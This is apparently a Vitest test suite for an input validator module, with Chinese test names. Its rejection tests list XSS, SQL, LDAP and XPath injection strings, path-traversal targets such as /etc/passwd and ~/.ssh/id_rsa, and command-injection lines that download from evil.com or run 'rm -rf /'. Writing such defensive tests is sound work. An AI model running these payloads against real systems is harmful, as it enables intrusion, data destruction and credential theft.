import { describe, it, expect } from 'vitest'
import { 
  InputValidator, 
  validateAndSanitizeSearchQuery, 
  validateFilePath, 
  validatePluginId, 
  validateMathExpression, 
  validateUrl, 
  sanitizeInput 
} from '@/lib/security/enhanced-input-validator-v2'

/**
 * 增强的输入验证器测试套件
 * 测试修复后的安全功能
 */

describe('增强的输入验证器测试', () => {
  describe('搜索查询验证测试', () => {
    it('应该阻止XSS攻击脚本注入', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'data:text/html,<script>alert(1)</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        '" onclick="alert(\'xss\')"',
        '<iframe src="javascript:alert(\'xss\')">',
        '<object data="javascript:alert(\'xss\')">',
        '<embed src="javascript:alert(\'xss\')">',
        'expression(alert("xss"))',
        'vbscript:alert("xss")',
        '@import url("javascript:alert(\'xss\')")'
      ]

      for (const payload of xssPayloads) {
        const result = validateAndSanitizeSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止SQL注入尝试', () => {
      const sqlPayloads = [
        'SELECT * FROM users',
        'DROP TABLE users',
        '1; DROP TABLE users--',
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        'UNION SELECT username, password FROM users',
        'SELECT * FROM information_schema.tables',
        'INSERT INTO users VALUES ("admin", "password")',
        'UPDATE users SET password="hacked"',
        'DELETE FROM users',
        'TRUNCATE TABLE users',
        'HAVING 1=1',
        'WHERE 1=1',
        'GROUP BY users',
        'ORDER BY 1',
        'LOAD_FILE("/etc/passwd")',
        'BENCHMARK(1000000,MD5(NOW()))',
        'SLEEP(10)',
        'WAITFOR DELAY "0:0:10"'
      ]

      for (const payload of sqlPayloads) {
        const result = validateAndSanitizeSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止命令注入尝试', () => {
      const commandPayloads = [
        'rm -rf /',
        'system("rm -rf /")',
        'exec("whoami")',
        '| ls -la',
        '; cat /etc/passwd',
        '&& wget http://evil.com/shell.sh',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        'nc -l -p 1337',
        'netcat -l -p 1337',
        'telnet evil.com 1337',
        'ssh user@evil.com',
        'scp file.txt user@evil.com:/tmp',
        'ping -c 100 evil.com',
        'nslookup evil.com',
        'dig evil.com',
        'whois evil.com',
        'chmod 777 /etc/passwd',
        'chown root:root /etc/passwd',
        '> /dev/null 2>&1 ;',
        '2>&1 | cat',
        'curl_exec("http://evil.com/shell.sh")',
        'wget http://evil.com/malware',
        'popen("ls -la")',
        'proc_open("ls -la")',
        'pcntl_exec("ls")'
      ]

      for (const payload of commandPayloads) {
        const result = validateAndSanitizeSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止路径遍历攻击', () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32\\config',
        'file:///etc/passwd',
        '....\\\\....\\\\....\\\\etc/passwd',
        '~/.ssh/id_rsa',
        '/.ssh/config',
        '/usr/bin/ls',
        '/var/log/apache2/access.log',
        '/tmp/test',
        '/dev/null',
        'C:\\Program Files\\test',
        '../../.env',
        '../../../.git/config',
        '../../../config.xml',
        '../../../web.config',
        '../../../.htaccess',
        '../../../hosts',
        '../../../shadow'
      ]

      for (const payload of pathTraversalPayloads) {
        const result = validateAndSanitizeSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止LDAP注入攻击', () => {
      const ldapPayloads = [
        '*)(objectClass=user))',
        '(|(objectClass=user)(uid=*))',
        '(&(objectClass=user)(uid=*)(cn=*))',
        '(uid=*)(cn=*))',
        '(&(objectClass=*)(objectClass=user))',
        '(|(objectClass=*)(cn=admin))'
      ]

      for (const payload of ldapPayloads) {
        const result = validateAndSanitizeSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该阻止XPath注入攻击', () => {
      const xpathPayloads = [
        '//user[name=\'admin\']',
        '//*[@*=\'admin\']',
        '//user[contains(name,\'admin\')]',
        '//user[starts-with(name,\'admin\')]',
        '//user[substring(name,1,4)=\'admin\']',
        '/user[@id=\'1\' or 1=1]',
        '/user[@id=\'1\' or \'a\'=\'a\']'
      ]

      for (const payload of xpathPayloads) {
        const result = validateAndSanitizeSearchQuery(payload)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险字符或模式'))).toBe(true)
      }
    })

    it('应该允许安全的搜索查询', () => {
      const safeQueries = [
        'hello world',
        'test document',
        'search file',
        'find users',
        'calculate 2+2',
        'convert units',
        'app settings',
        'plugin manager',
        'user preferences',
        'system configuration'
      ]

      for (const query of safeQueries) {
        const result = validateAndSanitizeSearchQuery(query)
        expect(result.isValid).toBe(true)
        expect(result.errors.length).toBe(0)
      }
    })

    it('应该正确处理超长输入', () => {
      const longInput = 'a'.repeat(1000)
      const result = validateAndSanitizeSearchQuery(longInput)
      
      expect(result.warnings).toContain('搜索查询过长，可能会影响性能')
      expect(result.sanitized.length).toBe(500)
    })

    it('应该正确消毒特殊字符', () => {
      const inputWithSpecialChars = 'test\x00\x1F\u2028\u2029<script>'
      const result = validateAndSanitizeSearchQuery(inputWithSpecialChars)
      
      expect(result.sanitized).not.toContain('\x00')
      expect(result.sanitized).not.toContain('\x1F')
      expect(result.sanitized).not.toContain('\u2028')
      expect(result.sanitized).not.toContain('\u2029')
    })

    it('应该拒绝空输入和只有空格的输入', () => {
      const emptyInputs = ['', '   ', '\t', '\n', ' \t\n ']
      
      for (const input of emptyInputs) {
        const result = validateAndSanitizeSearchQuery(input)
        expect(result.isValid).toBe(false)
        expect(result.errors).toContain('搜索查询不能为空')
      }
    })
  })

  describe('文件路径安全验证测试', () => {
    it('应该验证文件路径安全性', () => {
      const safePaths = [
        '/home/user/documents',
        'C:\\Users\\User\\Documents',
        './relative/path',
        'normal_file.txt',
        '/usr/local/bin/app',
        '/opt/app/config'
      ]

      const dangerousPaths = [
        '../../../etc/passwd',
        'C:\\Windows\\System32',
        '/etc/shadow',
        'file<>name.txt',
        'pipe|name.txt',
        '~/.ssh/id_rsa',
        '/.git/config',
        '/tmp/malicious.sh',
        '/dev/null',
        '../../.env'
      ]

      for (const path of safePaths) {
        const result = validateFilePath(path)
        expect(result.isValid).toBe(true)
      }

      for (const path of dangerousPaths) {
        const result = validateFilePath(path)
        expect(result.warnings.length).toBeGreaterThan(0)
      }
    })

    it('应该拒绝超长文件路径', () => {
      const longPath = 'a'.repeat(5000)
      const result = validateFilePath(longPath)
      
      expect(result.isValid).toBe(false)
      expect(result.errors).toContain('文件路径过长')
    })

    it('应该识别网络路径', () => {
      const networkPath = '\\\\server\\share\\file.txt'
      const result = validateFilePath(networkPath)
      
      expect(result.warnings.some(warning => warning.includes('网络路径'))).toBe(true)
    })
  })

  describe('数学表达式安全验证测试', () => {
    it('应该阻止代码注入到数学表达式', () => {
      const maliciousExpressions = [
        'function(){alert("xss")}()',
        'eval("alert(1)")',
        'new Function("return alert(1)")()',
        'setTimeout(function(){alert(1)},0)',
        'document.cookie',
        'window.location="http://evil.com"',
        'global.process',
        'require("fs")',
        'import("fs")',
        'process.exit(1)',
        'Function("return process")().exit()',
        'eval(require("child_process").execSync("ls").toString())',
        'setTimeout(eval, 0, "alert(1)")',
        'setInterval(eval, 0, "alert(1)")',
        'document.write("xss")',
        'window.open("http://evil.com")'
      ]

      for (const expr of maliciousExpressions) {
        const result = validateMathExpression(expr)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('危险模式'))).toBe(true)
      }
    })

    it('应该允许安全的数学表达式', () => {
      const safeExpressions = [
        '2 + 2',
        'sin(π/2)',
        'log(100)',
        'sqrt(16)',
        '3.14 * 2',
        '2^10',
        'abs(-5)',
        'floor(3.7)',
        'ceil(3.2)',
        'round(3.5)',
        'Math.PI',
        'Math.E',
        'Math.sin(0)',
        'Math.cos(0)',
        'Math.log(10)',
        'Math.sqrt(25)',
        'Math.abs(-10)',
        'Math.floor(3.14)',
        'Math.ceil(3.14)',
        'Math.round(3.5)'
      ]

      for (const expr of safeExpressions) {
        const result = validateMathExpression(expr)
        expect(result.isValid).toBe(true)
      }
    })
  })

  describe('URL安全验证测试', () => {
    it('应该验证URL安全性', () => {
      const safeUrls = [
        'https://example.com',
        'http://example.com',
        'mailto:user@example.com',
        'tel:+1234567890',
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA'
      ]

      const dangerousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:alert("xss")',
        'file:///etc/passwd',
        'about:blank',
        'chrome://settings',
        'moz-extension://test'
      ]

      for (const url of safeUrls) {
        const result = validateUrl(url)
        expect(result.isValid).toBe(true)
      }

      for (const url of dangerousUrls) {
        const result = validateUrl(url)
        expect(result.isValid).toBe(false)
      }
    })

    it('应该自动补充缺失的协议', () => {
      const urlWithoutProtocol = 'example.com'
      const result = validateUrl(urlWithoutProtocol)
      
      expect(result.isValid).toBe(true)
      expect(result.sanitized).toBe('https://example.com')
      expect(result.warnings.some(warning => warning.includes('缺少协议'))).toBe(true)
    })

    it('应该拒绝不安全的data协议', () => {
      const dangerousDataUrls = [
        'data:text/html,<script>alert(1)</script>',
        'data:text/javascript,alert(1)',
        'data:text/html;charset=utf-8,<html><script>alert(1)</script></html>'
      ]

      for (const url of dangerousDataUrls) {
        const result = validateUrl(url)
        expect(result.isValid).toBe(false)
        expect(result.errors.some(error => error.includes('不支持HTML或JavaScript内容'))).toBe(true)
      }
    })

    it('应该允许安全的data协议', () => {
      const safeDataUrls = [
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA',
        'data:application/json,{"test": "data"}',
        'data:text/plain,Hello World'
      ]

      for (const url of safeDataUrls) {
        const result = validateUrl(url)
        expect(result.isValid).toBe(true)
      }
    })
  })

  describe('插件ID安全验证测试', () => {
    it('应该验证插件ID格式', () => {
      const validIds = [
        'my-plugin',
        'test_plugin',
        'myPlugin123',
        'app-search',
        'file-manager',
        'unit-converter',
        'calculator',
        'weather-app'
      ]

      const invalidIds = [
        '123plugin',        // 数字开头
        'my plugin',        // 包含空格
        'my@plugin',        // 包含特殊字符
        'my',              // 太短
        'a'.repeat(51),     // 太长
        'system',          // 保留字
        'admin',           // 保留字
        'root',            // 保留字
        'core',            // 保留字
        'builtin',         // 保留字
        'api',             // 保留字
        'auth',            // 保留字
        'config',          // 保留字
        'test'             // 保留字
      ]

      for (const id of validIds) {
        const result = validatePluginId(id)
        expect(result.isValid).toBe(true)
      }

      for (const id of invalidIds) {
        const result = validatePluginId(id)
        expect(result.isValid).toBe(false)
      }
    })

    it('应该警告使用保留字', () => {
      const reservedWords = ['system', 'admin', 'root', 'core', 'builtin', 'api', 'auth', 'config', 'test']
      
      for (const word of reservedWords) {
        const result = validatePluginId(word)
        expect(result.warnings.some(warning => warning.includes('保留字'))).toBe(true)
      }
    })
  })

  describe('通用输入消毒测试', () => {
    it('应该正确消毒HTML内容', () => {
      const htmlInput = '<script>alert("xss")</script><div>Hello</div>'
      const sanitized = sanitizeInput(htmlInput)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).toContain('&lt;script&gt;')
      expect(sanitized).toContain('&lt;div&gt;')
    })

    it('应该正确消毒JavaScript协议', () => {
      const jsInput = 'javascript:alert("xss")'
      const sanitized = sanitizeInput(jsInput)
      
      expect(sanitized).toContain('javascript-disabled:')
    })

    it('应该移除控制字符', () => {
      const inputWithControlChars = 'test\x00\x01\x02\x1F'
      const sanitized = sanitizeInput(inputWithControlChars)
      
      expect(sanitized).toBe('test')
    })

    it('应该应用长度限制', () => {
      const longInput = 'a'.repeat(100)
      const sanitized = sanitizeInput(longInput, { maxLength: 50 })
      
      expect(sanitized.length).toBe(50)
    })

    it('应该提供配置选项', () => {
      const input = '<script>alert("test")</script>'
      
      // 允许HTML
      const allowHtml = sanitizeInput(input, { allowHtml: true })
      expect(allowHtml).toContain('<script>')
      
      // 不允许HTML
      const noHtml = sanitizeInput(input, { allowHtml: false })
      expect(noHtml).not.toContain('<script>')
    })

    it('应该允许控制字符选项', () => {
      const inputWithControlChars = 'test\x00\x01\x02\x1F'
      
      // 默认情况下移除控制字符
      const defaultSanitized = sanitizeInput(inputWithControlChars)
      expect(defaultSanitized).toBe('test')
      
      // 允许控制字符
      const allowControlChars = sanitizeInput(inputWithControlChars, { allowControlChars: true })
      expect(allowControlChars).toContain('\x00')
    })
  })

  describe('输入验证器类测试', () => {
    it('应该提供一致的接口', () => {
      // 测试所有静态方法
      expect(InputValidator.validateSearchQuery('test')).toBeDefined()
      expect(InputValidator.validateFilePath('/test')).toBeDefined()
      expect(InputValidator.validatePluginId('test')).toBeDefined()
      expect(InputValidator.validateMathExpression('2+2')).toBeDefined()
      expect(InputValidator.validateUrl('https://example.com')).toBeDefined()
      expect(InputValidator.sanitize('<script>')).toBeDefined()
    })

    it('应该保持方法一致性', () => {
      // 测试类方法与独立函数的一致性
      const query = 'test query'
      const classResult = InputValidator.validateSearchQuery(query)
      const functionResult = validateAndSanitizeSearchQuery(query)
      
      expect(classResult.isValid).toBe(functionResult.isValid)
      expect(classResult.sanitized).toBe(functionResult.sanitized)
    })
  })

  describe('性能和边界情况测试', () => {
    it('应该高效处理大量验证请求', () => {
      const testQueries = Array.from({ length: 100 }, (_, i) => `test query ${i}`)
      
      const startTime = performance.now()
      
      for (const query of testQueries) {
        InputValidator.validateSearchQuery(query)
      }
      
      const endTime = performance.now()
      const duration = endTime - startTime
      
      // 应该在100ms内完成100次验证
      expect(duration).toBeLessThan(100)
    })

    it('应该处理Unicode字符', () => {
      const unicodeInputs = [
        '测试中文',
        'テスト日本語',
        '테스트한국어',
        'test with émojis 🎉',
        'test with accents café',
        'test with Cyrillic тест'
      ]

      for (const input of unicodeInputs) {
        const result = InputValidator.validateSearchQuery(input)
        expect(result.isValid).toBe(true)
      }
    })

    it('应该处理混合内容', () => {
      const mixedInputs = [
        'normal text with <script>alert("xss")</script> inside',
        'SELECT * FROM users WHERE name = "test"',
        'file path /etc/passwd with normal text',
        'javascript:alert("xss") mixed with normal content',
        'rm -rf / and normal text'
      ]

      for (const input of mixedInputs) {
        const result = InputValidator.validateSearchQuery(input)
        // 包含危险内容的应该被拒绝
        expect(result.isValid).toBe(false)
      }
    })

    it('应该处理边缘情况', () => {
      const edgeCases = [
        '',                    // 空字符串
        '   ',                 // 只有空格
        '\t\n\r',             // 只有空白字符
        'a',                   // 单个字符
        'a'.repeat(501),       // 超过最大长度
        null,                  // null值
        undefined,             // undefined值
        123,                   // 数字
        {},                    // 对象
        []                     // 数组
      ]

      for (const input of edgeCases) {
        if (input === null || input === undefined) {
          continue // 跳过null/undefined，因为会抛出错误
        }
        
        try {
          const result = InputValidator.validateSearchQuery(input as string)
          // 对于无效输入，应该返回isValid=false
          if (!input || input.toString().trim().length === 0) {
            expect(result.isValid).toBe(false)
          }
        } catch (error) {
          // 如果抛出错误，也是可以接受的
          expect(error).toBeDefined()
        }
      }
    })
  })
})